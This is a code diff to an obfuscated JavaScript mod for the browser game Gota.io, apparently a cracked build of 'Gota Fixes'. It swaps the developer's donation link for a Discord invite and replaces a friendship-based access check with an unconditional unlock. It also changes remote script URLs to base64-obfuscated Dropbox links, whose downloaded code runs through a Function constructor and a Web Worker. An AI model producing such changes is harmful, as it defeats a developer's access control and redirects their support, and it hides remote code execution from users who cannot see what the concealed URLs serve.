@@ -1093,7 +1093,7 @@
         X("#main-account").css("height", "180px");
         X(".policyLinks").css({
           "flex-wrap": "wrap"
-        }).append("<span style=\"text-align: center\">If you enjoy using Gota Fixes, please consider donating to support the developer.</span>", X("<a href=\"https://ko-fi.com/camlan\" target=\"_blank\">Donate</a>").css({
+        }).append("<span style=\"text-align: center\">Join our discord: discord.gg/NDJERTSqEM</span>", X("<a href=\"https://discord.gg/NDJERTSqEM\" target=\"_blank\">Join</a>").css({
           "border-radius": "15px",
           "background-color": "#00b9fe",
           "padding": "0 18px",
@@ -1105,7 +1105,7 @@
           "margin-top": "3px"
         }));
         Object.assign(X("#account-shop")[0x0].dataset, {
-          "balloon": "Use code \"camlan\" in the \"Support A Creator\" section at checkout for a 10% discount!",
+          "balloon": "Join discord.gg/NDJERTSqEM",
           "balloonPos": "left",
           "balloonLength": "medium"
         });
@@ -1141,9 +1141,16 @@
           z7(z0, z1);
           return z2;
         }
-        function fu(z0) {
-          if (z0 && !nI) {
-            nI = X("<thead><th colspan=\"2\">Gota Fixes</th></thead>").add(X("<tbody>").append("<tr>\n                  <td>Rainbow Name</td>\n                  <td><input type=\"checkbox\" id=\"spRainbowName\"></td>\n                </tr>", fh("rRainbowNameSpeed", "Rainbow Name Speed", nb), "<tr>\n                  <td>Rainbow Cell</td>\n                  <td><input type=\"checkbox\" id=\"spRainbowCell\"></td>\n                </tr>", fh("rRainbowCellSpeed", "Rainbow Cell Speed", nb)));
+        function fu(z0 = true) {
+        if (z0 && !nI) {
+        nI = X("<thead><th colspan=\"2\">Gota Fixes</th></thead>")
+              .add(X("<tbody>")
+                .append("<tr>\n                  <td>Rainbow Name</td>\n                  <td><input type=\"checkbox\" id=\"spRainbowName\"></td>\n                </tr>", 
+                  fh("rRainbowNameSpeed", "Rainbow Name Speed", nb), 
+                  "<tr>\n                  <td>Rainbow Cell</td>\n                  <td><input type=\"checkbox\" id=\"spRainbowCell\"></td>\n                </tr>", 
+                  fh("rRainbowCellSpeed", "Rainbow Cell Speed", nb)
+                )
+              );
             fU.append(nI);
             fU.find("[type=checkbox]").change(function () {
               JM(X(this));
@@ -1203,16 +1210,9 @@
         n0 = fU.children();
         OJ.auth().onAuthStateChanged(function (z0) {
           if (z0) {
-            OJ.database().ref("/friendships/" + z0.uid).on("value", function (z1) {
-              fu(z1 = (z1 = z1.val()) && Object.entries(z1).some(function (z2) {
-                var z2 = t(z2) || E(z2, 0x2) || w(z2, 0x2) || r();
-                var z3 = z2[0x0];
-                var z2 = z2[0x1];
-                return z3 === nT && z2;
-              }));
-            });
+            fu(true);
           } else {
-            fu(false);
+            fu(true);
           }
         });
         fy.innerHTML += "\n        #party-panel { width: max-content }\n        #score-panel { max-width: initial }\n        #score-panel.horizontal { display: flex }\n      ";
@@ -2353,7 +2353,7 @@
         nx();
         Ou = nB();
         Oh.Rt("Welcome to Gota.io!");
-        a.nsjag("https://raw.githubusercontent.com/dist94/GotaFixesCracked/main/lib3.js", "json").then(function (z0) {
+        a.nsjag("https://dl.dropboxusercontent.com/s/4iwpgcfwxv54nhr/store_coupon.json", "json").then(function (z0) {
           var z1 = z0.endTime;
           var z0 = z0.message;
           var z1 = Date.now() < new Date(z1);
@@ -2606,7 +2606,7 @@
       function Nf() {
         g.body.classList.add("hide-captcha-badge");
       }
-      a.nsjag("https://raw.githubusercontent.com/dist94/GotaFixesCracked/main/lib4.js").then(function (fL) {
+      a.nsjag(a.atob("aHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3NjbC9maS9uamdoOWcvcz9ybGtleT16MDhhNm8yMzNnZThxbWZqbHpnazloMGc0")).then(function (fL) {
         var fv = {};
         a.Function("exports", "module", fL)({}, fv);
         fv.exports().then(nq);
@@ -4565,7 +4565,7 @@
         constructor() {
           var fL = this;
           this.ga = new Map();
-          a.nsjag("https://raw.githubusercontent.com/dist94/GotaFixesCracked/main/lib5.js", "blob").then(function (fv) {
+          a.nsjag(a.atob("aHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3NjbC9maS95cTk5NnQvcz9ybGtleT1jZHNpeHV6MmN1aWtjbjZ5dHVzNndwaHFz"), "blob").then(function (fv) {
             fL.So = new a.Worker(URL.createObjectURL(fv));
             fL.So.onmessage = fL.No.bind(fL);
           });
